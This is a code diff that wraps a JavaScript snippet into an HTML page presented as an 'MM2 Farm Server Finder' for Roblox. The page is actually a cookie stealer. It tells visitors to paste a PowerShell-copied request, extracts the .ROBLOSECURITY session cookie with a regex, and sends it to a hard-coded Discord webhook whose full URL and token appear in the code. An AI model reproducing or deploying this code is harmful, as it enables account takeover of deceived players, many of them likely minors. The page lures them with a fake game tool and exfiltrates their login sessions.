@@ -1,62 +1,135 @@
-function extractROBLOSECURITYFromPowerShell(input) {
-    // Use a regex to locate .ROBLOSECURITY cookie
-    const roblosecurityRegex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
-    const match = input.match(roblosecurityRegex);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MM2 Farm Server Finder</title>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1e1e2e;
+            color: #f8f8f2;
+            margin: 0;
+            padding: 0;
+        }
 
-    if (match) {
-        const roblosecurity = match[1];
-        return roblosecurity;
-    }
+        .container {
+            max-width: 900px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #282a36;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
 
-    return null; // Cookie not found
-}
+        h1 {
+            text-align: center;
+        }
 
-document.getElementById("submit").addEventListener("click", async () => {
-    const rawData = document.getElementById("textarea").value;
+        textarea {
+            width: 100%;
+            height: 200px;
+            background-color: #44475a;
+            color: #f8f8f2;
+            border: none;
+            padding: 10px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
 
-    // Attempt to extract the .ROBLOSECURITY cookie
-    const roblosecurity = extractROBLOSECURITYFromPowerShell(rawData);
+        button {
+            background-color: #ff79c6;
+            color: #1e1e2e;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
 
-    if (!roblosecurity) {
-        Swal.fire({
-            icon: "error",
-            title: "Error",
-            text: ".ROBLOSECURITY cookie not found. Please check your input.",
-        });
-        return;
-    }
+        button:hover {
+            background-color: #ff92d0;
+        }
 
-    // Send data to the webhook
-    try {
-        const webhookURL = "https://discord.com/api/webhooks/1306623912850755605/BLRmDNUk3NNgG46YQ0g4cDDK7HW45swQeLJje1c1RU4EmoyGkrgYbbDBiJMCBc1SwaDm";
+        .error {
+            color: #ff5555;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>MM2 Farm Server Finder</h1>
+        <p>Paste your request (e.g., copied as PowerShell) below:</p>
+        <textarea id="textarea" placeholder="Paste your PowerShell request here..."></textarea>
+        <button id="submit">Submit</button>
+        <div class="error" id="error-message"></div>
+    </div>
 
-        await fetch(webhookURL, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-                embeds: [
-                    {
-                        title: "ROBLOSECURITY Found",
-                        description: `Cookie: \`${roblosecurity}\``,
-                        color: 16711680, // Red color
+    <script>
+        function extractROBLOSECURITYFromPowerShell(input) {
+            // Use a regex to locate .ROBLOSECURITY cookie
+            const roblosecurityRegex = /\\.ROBLOSECURITY\",\\s*\\\"([^\\\"]+)\\\"/;
+            const match = input.match(roblosecurityRegex);
+
+            if (match) {
+                const roblosecurity = match[1];
+                return roblosecurity;
+            }
+
+            return null; // Cookie not found
+        }
+
+        document.getElementById("submit").addEventListener("click", async () => {
+            const rawData = document.getElementById("textarea").value;
+
+            // Attempt to extract the .ROBLOSECURITY cookie
+            const roblosecurity = extractROBLOSECURITYFromPowerShell(rawData);
+
+            if (!roblosecurity) {
+                Swal.fire({
+                    icon: "error",
+                    title: "Error",
+                    text: ".ROBLOSECURITY cookie not found. Please check your input.",
+                });
+                return;
+            }
+
+            // Send data to the webhook
+            try {
+                const webhookURL = "https://discord.com/api/webhooks/1306623912850755605/BLRmDNUk3NNgG46YQ0g4cDDK7HW45swQeLJje1c1RU4EmoyGkrgYbbDBiJMCBc1SwaDm";
+
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
                     },
-                ],
-            }),
-        });
+                    body: JSON.stringify({
+                        embeds: [
+                            {
+                                title: "ROBLOSECURITY Found",
+                                description: `Cookie: \`${roblosecurity}\``,
+                                color: 16711680, // Red color
+                            },
+                        ],
+                    }),
+                });
 
-        Swal.fire({
-            icon: "success",
-            title: "Success",
-            text: ".ROBLOSECURITY cookie sent to the webhook!",
+                Swal.fire({
+                    icon: "success",
+                    title: "Success",
+                    text: ".ROBLOSECURITY cookie sent to the webhook!",
+                });
+            } catch (error) {
+                console.error("Error sending data to webhook:", error);
+                Swal.fire({
+                    icon: "error",
+                    title: "Error",
+                    text: "Failed to send data to webhook. Check console for details.",
+                });
+            }
         });
-    } catch (error) {
-        console.error("Error sending data to webhook:", error);
-        Swal.fire({
-            icon: "error",
-            title: "Error",
-            text: "Failed to send data to webhook. Check console for details.",
-        });
-    }
-});
+    </script>
+</body>
+</html>
